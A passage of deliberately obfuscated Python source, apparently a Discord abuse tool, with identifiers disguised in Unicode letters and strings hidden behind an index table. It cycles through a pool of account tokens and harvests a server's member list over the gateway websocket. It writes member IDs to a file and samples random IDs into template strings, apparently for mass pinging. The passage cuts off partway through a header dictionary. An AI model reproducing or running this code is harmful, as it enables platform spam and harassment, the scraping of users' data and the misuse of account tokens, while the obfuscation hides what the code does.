            𝘁𝙝𝙧𝗲𝙖𝘥𝘪𝗻𝗴.Thread(target=𝙨𝘦𝗹𝘧.heartbeatThread, args=(𝗱𝘦𝙘𝙤𝗱𝗲𝗱[𝙄𝗡𝘐𝘕𝙡𝗹𝗜𝙈𝘐𝙄𝗹𝘔𝙡𝘭𝗜𝙡𝙡𝙉𝙉𝗜𝙡𝙡𝗠𝗡𝙡𝗡𝘭𝙈𝗜𝘔𝘐𝙈[166]][𝙄𝘕𝗜𝗡𝙡𝙡𝘐𝘔𝙄𝘐𝗹𝙈𝘭𝘭𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝗠𝗜𝗠[199]] / 1000,), daemon=True).start()
        if 𝘥𝙚𝘤𝗼𝘥𝙚𝗱[𝙄𝙉𝙄𝘕𝘭𝙡𝗜𝗠𝙄𝙄𝘭𝘔𝗹𝙡𝘐𝘭𝙡𝘕𝘕𝙄𝗹𝙡𝘔𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[200]] == 𝘐𝘕𝗜𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝗠𝘭𝗹𝗜𝗹𝘭𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝘭𝙈𝙄𝘔𝙄𝗠[201]:
            for 𝗴𝘶𝙞𝗹𝙙 in 𝗱𝗲𝘤𝙤𝗱𝙚𝘥[𝙄𝗡𝙄𝙉𝗹𝙡𝘐𝗠𝗜𝗜𝗹𝙈𝘭𝗹𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝘭𝗠𝗡𝘭𝗡𝙡𝗠𝙄𝘔𝙄𝙈[166]][𝘐𝘕𝙄𝗡𝗹𝙡𝙄𝙈𝘐𝗜𝙡𝘔𝗹𝘭𝘐𝘭𝘭𝘕𝗡𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝘭𝗠𝙄𝙈𝘐𝘔[202]]:
                𝘴𝘦𝘭𝙛.guilds[𝗴𝘶𝘪𝙡𝘥[𝙄𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝘐𝙄𝘭𝗠𝗹𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝗠𝗡𝗹𝙉𝙡𝗠𝗜𝘔𝘐𝙈[160]]] = {𝘐𝗡𝘐𝙉𝗹𝙡𝘐𝙈𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝘭𝙡𝗡𝙉𝗜𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝗠𝙄𝙈𝘐𝙈[159]: 𝙜𝘶𝗶𝘭𝗱[𝗜𝗡𝘐𝘕𝘭𝘭𝗜𝗠𝘐𝗜𝘭𝙈𝘭𝘭𝙄𝗹𝗹𝗡𝘕𝙄𝗹𝗹𝗠𝘕𝘭𝘕𝗹𝙈𝙄𝘔𝙄𝙈[159]]}
        if 𝗱𝙚𝙘𝘰𝗱𝗲𝙙[𝗜𝘕𝘐𝙉𝙡𝗹𝙄𝗠𝘐𝘐𝘭𝘔𝗹𝙡𝙄𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝗹𝙈𝙄𝙈𝗜𝙈[200]] == 𝙄𝙉𝗜𝗡𝘭𝗹𝘐𝗠𝙄𝘐𝘭𝘔𝗹𝗹𝘐𝘭𝗹𝗡𝘕𝙄𝗹𝘭𝙈𝘕𝙡𝙉𝘭𝘔𝗜𝗠𝗜𝗠[203]:
            𝘴𝘦𝘁𝙖𝘁𝙩𝙧(𝘀𝙚𝗹𝗳, 'ranges', 𝘜𝙩𝗶𝗹𝘴.getRanges(0, 100, 𝘴𝗲𝙡𝙛.guilds[𝙨𝙚𝙡𝘧.guild_id][𝗜𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝗹𝘕𝘭𝗠𝗜𝗠𝗜𝘔[159]]))
            𝘴𝗲𝙡𝙛.scrapeUsers()
        elif 𝙙𝗲𝗰𝘰𝘥𝗲𝗱[𝙄𝗡𝘐𝗡𝗹𝘭𝘐𝘔𝘐𝙄𝙡𝗠𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝗠𝙄𝗠𝘐𝙈[200]] == 𝘐𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝙄𝗜𝗹𝘔𝙡𝘭𝙄𝘭𝘭𝘕𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝙈[204]:
            𝙥𝘢𝘳𝘀𝗲𝗱 = 𝗨𝙩𝗶𝙡𝘀.parseGuildMemberListUpdate(𝘥𝙚𝗰𝘰𝗱𝘦𝙙)
            if 𝙥𝗮𝗿𝘀𝗲𝗱[𝙄𝘕𝙄𝗡𝙡𝘭𝙄𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝗹𝘭𝙉𝘕𝙄𝗹𝙡𝘔𝗡𝗹𝘕𝘭𝗠𝙄𝗠𝙄𝙈[161]] == 𝘀𝗲𝘭𝘧.guild_id and (𝘐𝘕𝘐𝙉𝘭𝙡𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝙄𝘔𝗜𝘔[170] in 𝘱𝙖𝗿𝙨𝘦𝙙[𝙄𝙉𝘐𝗡𝙡𝗹𝘐𝙈𝗜𝗜𝘭𝘔𝗹𝘭𝘐𝗹𝘭𝗡𝘕𝙄𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝘐𝗠𝘐𝘔[163]] or 𝙄𝗡𝗜𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝘭𝘔𝙡𝗹𝗜𝘭𝗹𝗡𝗡𝘐𝙡𝘭𝗠𝗡𝘭𝙉𝗹𝙈𝙄𝙈𝗜𝗠[175] in 𝗽𝗮𝗿𝘀𝙚𝙙[𝗜𝗡𝗜𝙉𝗹𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝘭𝙈𝘕𝘭𝘕𝙡𝙈𝘐𝙈𝘐𝗠[163]]):
                for 𝙚𝗹𝙚𝗺, 𝙞𝗻𝗱𝙚𝘹 in 𝙚𝙣𝘂𝘮𝙚𝙧𝗮𝘁𝗲(𝗽𝗮𝙧𝙨𝙚𝘥[𝗜𝘕𝙄𝘕𝙡𝙡𝙄𝙈𝙄𝙄𝗹𝙈𝗹𝗹𝗜𝘭𝘭𝙉𝙉𝘐𝘭𝙡𝙈𝙉𝙡𝙉𝙡𝗠𝘐𝘔𝙄𝘔[163]]):
                    if 𝘪𝗻𝗱𝗲𝙭 == 𝗜𝗡𝙄𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝗹𝘭𝙄𝙡𝗹𝙉𝘕𝙄𝘭𝙡𝙈𝗡𝙡𝗡𝘭𝙈𝗜𝙈𝘐𝙈[170]:
                        if 𝘭𝘦𝘯(𝗽𝙖𝗿𝘴𝗲𝘥[𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝙈𝘐𝗜𝘭𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝘕𝗜𝘭𝙡𝙈𝗡𝙡𝘕𝘭𝙈𝗜𝙈𝗜𝘔[165]][𝙚𝘭𝗲𝙢]) == 0:
                            𝙨𝙚𝘵𝙖𝘵𝙩𝙧(𝙨𝗲𝙡𝗳, 'endScraping', True)
                            break
                        for 𝗶𝘁𝗲𝗺 in 𝗽𝘢𝗿𝘀𝘦𝗱[𝙄𝙉𝘐𝘕𝗹𝙡𝘐𝙈𝙄𝘐𝗹𝙈𝙡𝘭𝙄𝘭𝙡𝗡𝙉𝙄𝗹𝗹𝙈𝗡𝗹𝙉𝘭𝘔𝘐𝘔𝗜𝘔[165]][𝙚𝗹𝘦𝘮]:
                            if 𝙄𝗡𝙄𝙉𝗹𝗹𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝘕𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝗠[205] in 𝙞𝙩𝙚𝙢:
                                𝘮𝙚𝙢 = 𝙞𝘁𝙚𝘮[𝙄𝗡𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝗡𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝗜𝘔𝘐𝗠[205]]
                                𝙤𝗯𝗷 = {𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝘭𝙈𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝙡𝘭𝘔𝙉𝗹𝙉𝘭𝙈𝗜𝙈𝙄𝘔[206]: 𝘮𝗲𝙢[𝘐𝙉𝘐𝗡𝙡𝙡𝘐𝘔𝗜𝙄𝙡𝘔𝘭𝘭𝙄𝘭𝙡𝙉𝙉𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝙈[207]][𝙄𝗡𝘐𝘕𝘭𝙡𝙄𝗠𝙄𝙄𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝘕𝙄𝘭𝘭𝘔𝘕𝙡𝗡𝙡𝗠𝙄𝘔𝙄𝙈[208]] + 𝘐𝘕𝘐𝘕𝙡𝘭𝗜𝙈𝘐𝗜𝗹𝙈𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝗡𝗹𝘔𝗜𝗠𝙄𝘔[209] + 𝘮𝗲𝗺[𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝙡𝗠𝗹𝗹𝗜𝙡𝘭𝙉𝗡𝗜𝙡𝙡𝙈𝗡𝘭𝙉𝗹𝙈𝘐𝗠𝗜𝗠[207]][𝗜𝙉𝗜𝗡𝗹𝘭𝘐𝘔𝗜𝗜𝙡𝙈𝘭𝗹𝘐𝗹𝙡𝙉𝙉𝗜𝗹𝘭𝘔𝗡𝗹𝗡𝗹𝙈𝙄𝗠𝗜𝗠[210]], 𝗜𝙉𝗜𝙉𝙡𝙡𝙄𝗠𝘐𝘐𝘭𝗠𝙡𝙡𝘐𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝘕𝘭𝘕𝘭𝘔𝗜𝘔𝙄𝘔[160]: 𝙢𝙚𝗺[𝗜𝘕𝙄𝗡𝗹𝘭𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝘭𝘭𝗡𝘕𝘐𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝗜𝙈𝙄𝗠[207]][𝘐𝗡𝘐𝙉𝗹𝙡𝗜𝙈𝙄𝗜𝙡𝗠𝙡𝗹𝗜𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝘭𝗡𝗹𝗠𝙄𝘔𝗜𝘔[160]]}
                                if not 𝙢𝙚𝗺[𝘐𝘕𝘐𝗡𝙡𝙡𝗜𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝘕𝗜𝙡𝘭𝗠𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝙄𝘔[207]].get(𝙄𝙉𝘐𝗡𝙡𝙡𝗜𝗠𝗜𝗜𝗹𝘔𝙡𝙡𝘐𝘭𝗹𝗡𝘕𝘐𝙡𝘭𝗠𝙉𝘭𝙉𝘭𝙈𝙄𝙈𝙄𝘔[211]):
                                    𝙨𝙚𝗹𝗳.members[𝘮𝙚𝘮[𝗜𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝘐𝙄𝘭𝙈𝗹𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝙡𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝘐𝗠𝙄𝗠[207]][𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝘔𝙄𝘐𝙡𝘔𝙡𝙡𝘐𝙡𝘭𝗡𝘕𝙄𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝗠𝗜𝘔𝙄𝘔[160]]] = 𝙤𝗯𝘫
                    elif 𝙞𝗻𝙙𝗲𝘹 == 𝗜𝗡𝘐𝗡𝗹𝘭𝗜𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝗠𝙄𝙈[175]:
                        for 𝘪𝘁𝗲𝗺 in 𝘱𝙖𝗿𝘴𝗲𝙙[𝘐𝙉𝗜𝘕𝘭𝗹𝗜𝗠𝘐𝗜𝙡𝗠𝘭𝗹𝙄𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝘔𝗡𝘭𝘕𝘭𝙈𝗜𝘔𝘐𝙈[165]][𝙚𝗹𝗲𝘮]:
                            if 𝙄𝙉𝘐𝘕𝙡𝙡𝗜𝗠𝗜𝙄𝙡𝙈𝗹𝘭𝘐𝙡𝙡𝘕𝗡𝗜𝘭𝘭𝙈𝘕𝗹𝘕𝗹𝗠𝗜𝗠𝗜𝗠[205] in 𝙞𝘁𝘦𝗺:
                                𝗺𝗲𝘮 = 𝘪𝙩𝘦𝘮[𝘐𝘕𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝗜𝗹𝘔𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝗡𝘭𝘕𝙡𝙈𝙄𝘔𝙄𝘔[205]]
                                𝙤𝘣𝗷 = {𝗜𝗡𝙄𝙉𝙡𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝙡𝗜𝗹𝗹𝙉𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝙡𝘔𝙄𝙈𝙄𝘔[206]: 𝙢𝗲𝘮[𝘐𝘕𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝘐𝘭𝘔𝗹𝙡𝙄𝘭𝘭𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝗹𝙉𝗹𝗠𝗜𝘔𝙄𝘔[207]][𝗜𝘕𝙄𝗡𝙡𝙡𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝘕𝙡𝘕𝙡𝘔𝙄𝗠𝙄𝘔[208]] + 𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝘔𝙄𝙄𝘭𝙈𝙡𝗹𝙄𝙡𝙡𝙉𝘕𝙄𝗹𝙡𝗠𝙉𝘭𝗡𝘭𝗠𝗜𝘔𝘐𝙈[209] + 𝗺𝘦𝙢[𝙄𝘕𝗜𝙉𝘭𝘭𝘐𝙈𝙄𝙄𝘭𝘔𝙡𝗹𝙄𝘭𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝗡𝗹𝗡𝘭𝙈𝗜𝗠𝙄𝙈[207]][𝘐𝗡𝗜𝙉𝗹𝙡𝙄𝗠𝘐𝘐𝙡𝙈𝙡𝘭𝙄𝗹𝗹𝗡𝙉𝗜𝘭𝙡𝘔𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝗜𝗠[210]], 𝗜𝙉𝘐𝙉𝗹𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝘭𝗹𝘕𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝗡𝘭𝘔𝗜𝙈𝗜𝙈[160]: 𝙢𝙚𝘮[𝘐𝘕𝗜𝘕𝙡𝙡𝘐𝗠𝗜𝘐𝗹𝘔𝗹𝙡𝙄𝗹𝗹𝙉𝘕𝘐𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝗠𝘐𝙈𝘐𝙈[207]][𝗜𝘕𝘐𝘕𝘭𝘭𝘐𝗠𝙄𝗜𝗹𝙈𝘭𝗹𝘐𝘭𝗹𝘕𝙉𝗜𝗹𝗹𝘔𝗡𝗹𝘕𝘭𝙈𝗜𝘔𝙄𝘔[160]]}
                                if not 𝙢𝗲𝗺[𝗜𝗡𝗜𝙉𝘭𝗹𝗜𝗠𝙄𝘐𝘭𝘔𝘭𝙡𝙄𝗹𝗹𝙉𝙉𝘐𝙡𝗹𝙈𝘕𝗹𝘕𝘭𝘔𝘐𝗠𝙄𝘔[207]].get(𝘐𝙉𝙄𝘕𝘭𝘭𝗜𝘔𝘐𝘐𝗹𝘔𝘭𝘭𝘐𝘭𝗹𝙉𝗡𝘐𝗹𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝙄𝘔𝗜𝙈[211]):
                                    𝙨𝘦𝘭𝘧.members[𝗺𝘦𝘮[𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝘔𝗜𝗜𝙡𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝙉𝗜𝙡𝗹𝗠𝘕𝙡𝙉𝙡𝗠𝘐𝙈𝙄𝙈[207]][𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝘔𝘐𝘐𝗹𝗠𝗹𝗹𝘐𝙡𝙡𝙉𝙉𝘐𝘭𝗹𝘔𝘕𝙡𝗡𝘭𝘔𝙄𝗠𝘐𝙈[160]]] = 𝙤𝙗𝗷
                    𝘀𝗲𝙡𝗳.lastRange += 1
                    𝘀𝘦𝙩𝗮𝘁𝙩𝗿(𝙨𝙚𝗹𝙛, 'ranges', 𝙐𝙩𝗶𝗹𝙨.getRanges(𝘴𝘦𝙡𝘧.lastRange, 100, 𝙨𝘦𝙡𝙛.guilds[𝘀𝘦𝘭𝘧.guild_id][𝙄𝙉𝘐𝙉𝗹𝙡𝗜𝘔𝙄𝗜𝗹𝗠𝘭𝙡𝗜𝗹𝙡𝙉𝙉𝘐𝙡𝘭𝘔𝘕𝘭𝗡𝗹𝗠𝗜𝙈𝘐𝗠[159]]))
                    𝙩𝘪𝗺𝘦.sleep(0.45)
                    𝙨𝘦𝙡𝗳.scrapeUsers()
            if 𝘀𝙚𝘭𝙛.endScraping:
                𝘀𝘦𝙡𝙛.close()

    def sock_close(self, ws, close_code, close_msg):
        pass

def scrape(token, guild_id, channel_id):
    𝘀𝗯 = 𝘿𝗶𝙨𝙘𝗼𝙧𝙙𝗦𝙤𝘤𝗸𝙚𝘵(𝘁𝘰𝗸𝘦𝘯, 𝘨𝘶𝗶𝘭𝗱_𝗶𝘥, 𝙘𝙝𝘢𝗻𝙣𝙚𝗹_𝘪𝗱)
    return 𝘀𝙗.run()

def scraper(guildid, channelid):
    with 𝙤𝗽𝙚𝙣(𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝙄𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝙈𝗜𝘔𝘐𝘔[212], 𝙄𝙉𝙄𝗡𝙡𝘭𝙄𝗠𝘐𝘐𝘭𝗠𝘭𝙡𝗜𝙡𝙡𝙉𝘕𝘐𝘭𝙡𝙈𝗡𝙡𝘕𝘭𝘔𝘐𝙈𝗜𝙈[213]) as 𝘧:
        𝗳.truncate(0)
    𝙩𝘰𝗸𝗲𝗻 = 𝘐𝗡𝘐𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝙡𝘔𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝙉𝙡𝗡𝘭𝘔𝙄𝘔𝙄𝙈[22]
    𝘁𝗼𝘬𝗲𝗻𝙨𝗶𝘯𝙜𝘂𝘪𝘭𝘥 = []
    𝘵𝙤𝘬𝗲𝙣 = 𝙧𝙖𝙣𝗱𝙤𝙢.choice(𝘵𝙤𝘬𝘦𝘯𝘴)
    𝘂𝗿𝙡 = f'{𝗜𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝙄𝙄𝗹𝙈𝙡𝙡𝙄𝗹𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝗹𝙉𝙡𝙈𝙄𝗠𝙄𝘔[152]}{𝗴𝙪𝙞𝗹𝘥𝗶𝙙}'

    def checktokens(token):
        𝙧 = 𝗿𝙚𝗾𝘶𝙚𝘴𝘵𝘴.get(𝘂𝗿𝘭, headers={𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝗹𝗡𝙉𝗜𝘭𝘭𝗠𝙉𝘭𝘕𝗹𝙈𝗜𝘔𝘐𝘔[130]: 𝘁𝗼𝘬𝗲𝘯})
        if 𝙧.status_code == 200:
            𝘵𝘰𝗸𝘦𝘯𝘴𝗶𝘯𝘨𝘶𝗶𝙡𝗱.append(𝘁𝗼𝙠𝘦𝗻)
    𝘵𝙝𝙧𝘦𝙖𝙙𝙨 = []
    for 𝙩𝙤𝙠𝗲𝘯 in 𝙩𝙤𝘬𝘦𝙣𝘀:
        𝘁 = 𝘵𝙝𝙧𝗲𝙖𝘥𝙞𝗻𝙜.Thread(target=𝙘𝗵𝘦𝗰𝙠𝘁𝙤𝘬𝘦𝙣𝙨, args=(f'{𝘁𝗼𝗸𝘦𝙣}',))
        𝘁.start()
        𝘵𝘩𝘳𝙚𝗮𝘥𝘀.append(𝘁)
    for 𝘵 in 𝘵𝙝𝗿𝙚𝗮𝙙𝘴:
        𝘵.join()
    try:
        𝙩𝙤𝗸𝙚𝗻 = 𝘳𝘢𝙣𝙙𝙤𝗺.choice(𝘁𝗼𝙠𝘦𝗻𝘴𝙞𝙣𝙜𝘂𝗶𝘭𝗱)
    except:
        𝗽𝙧𝙞𝙣𝙩(𝗜𝘕𝘐𝗡𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝘐𝗹𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝗡𝙡𝗡𝗹𝘔𝗜𝙈𝗜𝘔[214])
        𝘦𝘅𝙞𝘵(0)
    𝙢𝙚𝘮𝗯𝘦𝙧𝙨 = 𝙨𝘤𝙧𝙖𝙥𝗲(𝘵𝙤𝘬𝗲𝘯, f'{𝘨𝙪𝗶𝗹𝙙𝘪𝗱}', f'{𝙘𝘩𝙖𝘯𝘯𝗲𝙡𝙞𝘥}')
    for 𝘮𝘦𝗺𝘣𝘦𝘳 in 𝘮𝘦𝘮𝙗𝗲𝙧𝘀:
        𝗼𝘱𝙚𝗻(𝘐𝙉𝗜𝗡𝗹𝙡𝙄𝘔𝙄𝙄𝗹𝘔𝘭𝗹𝙄𝗹𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝗡𝗹𝘕𝘭𝗠𝘐𝘔𝘐𝗠[212], 𝘐𝙉𝙄𝘕𝘭𝙡𝘐𝗠𝙄𝙄𝙡𝗠𝙡𝗹𝗜𝙡𝙡𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝗹𝙉𝘭𝘔𝘐𝙈𝗜𝗠[215]).write(𝘕𝘵𝘹𝗷𝗖𝙯8𝗣𝘼𝗹𝗫7𝙣𝙊𝘠𝘍𝙫𝘧𝘏𝙡1𝙡𝙪𝘽𝘫𝙝𝘪𝙂𝗔𝘪𝗨𝘊.mro()[6](𝙢𝗲𝘮𝘣𝗲𝘳) + 𝗜𝘕𝘐𝗡𝘭𝘭𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝙡𝘐𝗹𝗹𝘕𝙉𝗜𝙡𝗹𝗠𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝙈[63])

def getrandomids(ids):
    with 𝙤𝘱𝗲𝙣(f'{𝙄𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝙄𝙡𝘔𝙡𝘭𝘐𝗹𝙡𝘕𝗡𝗜𝗹𝗹𝘔𝙉𝙡𝗡𝙡𝙈𝘐𝙈𝗜𝙈[212]}', 𝙄𝘕𝗜𝘕𝗹𝙡𝗜𝙈𝙄𝘐𝗹𝘔𝙡𝙡𝙄𝗹𝙡𝗡𝘕𝗜𝙡𝗹𝘔𝘕𝘭𝘕𝙡𝘔𝙄𝙈𝘐𝘔[30], encoding=𝘐𝙉𝘐𝗡𝗹𝘭𝘐𝗠𝗜𝘐𝗹𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝗡𝘐𝘭𝗹𝗠𝗡𝘭𝘕𝗹𝘔𝘐𝙈𝗜𝗠[27]) as 𝗳:
        𝘥𝘪𝘀𝘤𝙤𝙧𝙙_𝘂𝙨𝘦𝗿𝙨 = [𝙡𝗶𝗻𝗲.strip() for 𝗹𝙞𝙣𝗲 in 𝗳.readlines()]
    𝘳𝙖𝗻𝙙𝘰𝗺_𝙞𝘥𝙨 = 𝗿𝗮𝗻𝙙𝗼𝙢.sample(𝘥𝗶𝘀𝗰𝙤𝗿𝗱_𝘶𝘀𝙚𝗿𝙨, 𝗶𝙙𝙨)
    return 𝗜𝗡𝘐𝗡𝗹𝙡𝗜𝙈𝗜𝘐𝗹𝗠𝘭𝗹𝘐𝘭𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝗡𝘭𝙉𝙡𝗠𝙄𝗠𝘐𝘔[216] + 𝙄𝗡𝙄𝘕𝗹𝘭𝘐𝘔𝗜𝙄𝘭𝘔𝗹𝗹𝙄𝗹𝗹𝗡𝗡𝗜𝗹𝙡𝘔𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝗜𝘔[217].join(𝗿𝗮𝘯𝗱𝙤𝗺_𝙞𝘥𝘀) + 𝗜𝗡𝗜𝘕𝘭𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝙡𝘭𝘐𝙡𝗹𝗡𝘕𝙄𝘭𝘭𝗠𝘕𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝙈[218]

def Headers(token):
    return {𝙄𝙉𝗜𝗡𝘭𝗹𝙄𝙈𝗜𝙄𝘭𝘔𝗹𝙡𝗜𝘭𝗹𝘕𝙉𝙄𝗹𝘭𝙈𝘕𝙡𝘕𝙡𝙈𝗜𝙈𝙄𝙈[219]: 𝙩𝙤𝗸𝘦𝘯, 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝗠𝙡𝘭𝙄𝗹𝘭𝙉𝙉𝗜𝙡𝘭𝙈𝗡𝘭𝘕𝙡𝘔𝗜𝘔𝘐𝘔[127]: 𝗜𝗡𝘐𝘕𝘭𝙡𝘐𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝙄𝘭𝘭𝙉𝙉𝘐𝘭𝗹𝗠𝗡𝙡𝘕𝘭𝘔𝗜𝙈𝗜𝗠[136], 𝙄𝙉𝘐𝘕𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝘭𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝘭𝘭𝘔𝙉𝘭𝙉𝙡𝗠𝘐𝗠𝗜𝙈[128]: 𝗜𝙉𝗜𝙉𝗹𝙡𝗜𝙈𝘐𝘐𝘭𝗠𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝘭𝙡𝘔𝙉𝗹𝗡𝘭𝗠𝙄𝗠𝘐𝙈[137], 𝙄𝗡𝙄𝙉𝙡𝘭𝘐𝙈𝙄𝘐𝙡𝘔𝙡𝘭𝙄𝗹𝗹𝙉𝙉𝙄𝘭𝗹𝘔𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝙄𝗠[129]: 𝗜𝗡𝙄𝗡𝘭𝗹𝗜𝙈𝘐𝘐𝗹𝘔𝘭𝗹𝙄𝙡𝙡𝘕𝘕𝙄𝘭𝗹𝘔𝗡𝘭𝗡𝘭𝘔𝗜𝙈𝘐𝘔[230], 𝗜𝘕𝘐𝙉𝘭𝙡𝘐𝘔𝙄𝙄𝘭𝙈𝙡𝗹𝘐𝙡𝙡𝙉𝗡𝘐𝘭𝘭𝙈𝘕𝗹𝙉𝙡𝗠𝗜𝗠𝗜𝗠[220]: 𝙄𝘕𝙄𝗡𝘭𝘭𝙄𝙈𝙄𝗜𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝘕𝙉𝘐𝙡𝗹𝙈𝙉𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝘔[231], 𝙄𝙉𝙄𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝘭𝘐𝗹𝙡𝘕𝙉𝙄𝗹𝗹𝗠𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝙄𝘔[131]: 𝘐𝗡𝗜𝘕𝘭𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝙡𝘭𝙄𝗹𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝗡𝘭𝙉𝗹𝙈𝙄𝙈𝘐𝗠[232], 𝘐𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝗜𝙡𝘔𝗹𝗹𝘐𝙡𝙡𝙉𝘕𝙄𝙡𝙡𝗠𝘕𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝙈[221]: 𝘐𝗡𝙄𝘕𝙡𝗹𝘐𝙈𝗜𝙄𝘭𝘔𝙡𝙡𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝙡𝙈𝘕𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝙈[100], 𝘐𝙉𝘐𝙉𝘭𝗹𝘐𝗠𝗜𝗜𝗹𝘔𝙡𝙡𝗜𝗹𝘭𝙉𝗡𝙄𝗹𝘭𝗠𝘕𝗹𝗡𝗹𝙈𝙄𝘔𝘐𝘔[222]: 